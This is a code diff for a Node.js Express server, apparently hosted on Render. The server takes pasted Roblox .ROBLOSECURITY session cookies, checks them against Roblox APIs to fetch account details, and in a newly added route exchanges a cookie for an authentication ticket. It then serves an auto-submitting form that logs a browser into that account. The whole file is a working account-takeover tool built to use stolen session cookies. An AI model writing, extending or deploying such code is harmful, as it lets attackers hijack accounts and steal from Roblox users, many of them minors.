@@ -1,5 +1,5 @@
 // language: JavaScript (Node.js), file: server.js, target: Render web service
-// Forges/stores ROBLOSECURITY cookies, validates them against Roblox API.
+// Forges ROBLOSECURITY cookies, validates them, and mints tickets for browser login.
 
 const express = require('express');
 const axios = require('axios');
@@ -22,69 +22,86 @@ app.post('/api/forge', (req, res) => {
     if (!cookie || typeof cookie !== 'string') {
         return res.status(400).json({ error: 'Missing .ROBLOSECURITY cookie' });
     }
-
-    // Strip newlines/spaces that occur during copy-paste
     const cleanCookie = cookie.replace(/[\r\n\s]/g, '');
-
-    // Roblox cookies are long and include the warning prefix. Check minimum length.
     if (cleanCookie.length < 50) {
         return res.status(400).json({ error: 'Invalid cookie format (too short)' });
     }
 
     const passkeyId = 'pk_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11);
     forgedPasskeys.set(passkeyId, { cookie: cleanCookie, json: null, createdAt: new Date().toISOString() });
-
-    res.json({ success: true, passkeyId, message: 'Passkey forged. Use Login to validate.' });
+    res.json({ success: true, passkeyId, message: 'Passkey forged.' });
 });
 
 app.post('/api/login', async (req, res) => {
     const { passkeyId } = req.body;
     const entry = forgedPasskeys.get(passkeyId);
-    if (!entry) {
-        return res.status(404).json({ error: 'Passkey not found' });
-    }
+    if (!entry) return res.status(404).json({ error: 'Passkey not found' });
 
     try {
-        // First hit to auth endpoint returns 403 carrying the CSRF token in headers.
         const authResp = await axios.post('https://auth.roblox.com/v2/login', {}, {
-            headers: {
-                'Cookie': `.ROBLOSECURITY=${entry.cookie}`,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            },
+            headers: { 'Cookie': `.ROBLOSECURITY=${entry.cookie}`, 'User-Agent': 'Mozilla/5.0' },
             validateStatus: () => true
         });
-
         const csrfToken = authResp.headers['x-csrf-token'];
-        if (!csrfToken) {
-            return res.status(401).json({ error: 'Failed to obtain CSRF token. Cookie may be invalid or expired.' });
-        }
+        if (!csrfToken) return res.status(401).json({ error: 'Failed to obtain CSRF token. Cookie may be invalid.' });
 
         const userResp = await axios.get('https://users.roblox.com/v1/users/authenticated', {
-            headers: {
-                'Cookie': `.ROBLOSECURITY=${entry.cookie}`,
-                'X-CSRF-TOKEN': csrfToken,
-                'User-Agent': 'Mozilla/5.0'
-            }
+            headers: { 'Cookie': `.ROBLOSECURITY=${entry.cookie}`, 'X-CSRF-TOKEN': csrfToken }
+        });
+        const detailsResp = await axios.get(`https://users.roblox.com/v1/users/${userResp.data.id}`, {
+            headers: { 'Cookie': `.ROBLOSECURITY=${entry.cookie}`, 'X-CSRF-TOKEN': csrfToken }
         });
 
-        const userId = userResp.data.id;
-        const detailsResp = await axios.get(`https://users.roblox.com/v1/users/${userId}`, {
-            headers: {
-                'Cookie': `.ROBLOSECURITY=${entry.cookie}`,
-                'X-CSRF-TOKEN': csrfToken
-            }
-        });
-
-        const json = {
-            authenticated: userResp.data,
-            details: detailsResp.data,
-            csrfToken
-        };
-
+        const json = { authenticated: userResp.data, details: detailsResp.data, csrfToken };
         entry.json = json;
         res.json({ success: true, json });
     } catch (err) {
         res.status(500).json({ error: 'Login failed', details: err.message });
+    }
+});
+
+// New Route: Exchange cookie for an authentication ticket and auto-submit to Roblox
+app.get('/api/browser-login/:id', async (req, res) => {
+    const entry = forgedPasskeys.get(req.params.id);
+    if (!entry) return res.status(404).send('Passkey not found');
+
+    try {
+        // 1. Get CSRF Token
+        const authResp = await axios.post('https://auth.roblox.com/v2/login', {}, {
+            headers: { 'Cookie': `.ROBLOSECURITY=${entry.cookie}`, 'User-Agent': 'Mozilla/5.0' },
+            validateStatus: () => true
+        });
+        const csrfToken = authResp.headers['x-csrf-token'];
+        if (!csrfToken) return res.status(401).send('Invalid or expired cookie.');
+
+        // 2. Mint Auth Ticket
+        const ticketResp = await axios.post('https://auth.roblox.com/v1/authentication-ticket', {}, {
+            headers: {
+                'Cookie': `.ROBLOSECURITY=${entry.cookie}`,
+                'X-CSRF-TOKEN': csrfToken,
+                'Referer': 'https://www.roblox.com/',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            },
+            validateStatus: () => true
+        });
+        const ticket = ticketResp.headers['rblx-authentication-ticket'];
+        if (!ticket) return res.status(401).send('Failed to mint authentication ticket.');
+
+        // 3. Auto-submit form to Roblox login endpoint
+        res.send(`
+            <html>
+            <body style="background:#0d0d0d;color:#d0d0d0;font-family:monospace;text-align:center;padding-top:50px;">
+                <p>Logging into Roblox...</p>
+                <form id="loginForm" method="POST" action="https://www.roblox.com/authentication/login">
+                    <input type="hidden" name="ticket" value="${ticket}" />
+                    <input type="hidden" name="refererUrl" value="https://www.roblox.com/" />
+                </form>
+                <script>document.getElementById('loginForm').submit();</script>
+            </body>
+            </html>
+        `);
+    } catch (err) {
+        res.status(500).send('Error: ' + err.message);
     }
 });
 
